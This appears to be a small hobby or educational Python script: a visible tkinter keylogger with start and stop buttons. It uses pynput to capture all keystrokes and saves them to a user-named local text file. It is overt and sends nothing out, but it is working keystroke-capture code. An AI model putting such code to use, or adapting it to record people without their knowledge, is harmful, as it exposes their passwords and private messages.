from pynput import keyboard
import tkinter as tk
from tkinter import simpledialog

keylogger_listener = None
filename=""
key_logs=[""]

def on_press(key):
    try:
        key_char = key.char
        key_logs.append(key_char)
    except AttributeError:
        key_name = str(key).replace("Key.", "<") + ">"
        key_logs.append(key_name)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    start_button["state"]=tk.DISABLED
    stop_button["state"]=tk.NORMAL
    global keylogger_listener
    keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keylogger_listener.start()

def stop_keylogger():
    global keylogger_listener
    if keylogger_listener:
        start_button["state"]=tk.NORMAL
        stop_button["state"]=tk.DISABLED
        keylogger_listener.stop()
        keylogger_listener = None
        ROOT = tk.Tk()
        ROOT.title("Filename")
        ROOT.geometry("300x200")
        filename=simpledialog.askstring(title="Filename",prompt="Enter Filename :",parent=ROOT)
        ROOT.withdraw()
        with open('{0}.txt'.format(filename), 'a') as file:
            file.write("\n".join(str(x) for x in key_logs))

window = tk.Tk()
window.title("Keylogger")
window.geometry("300x200")

start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

stop_button = tk.Button(window, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)
stop_button["state"]=tk.DISABLED

window.mainloop()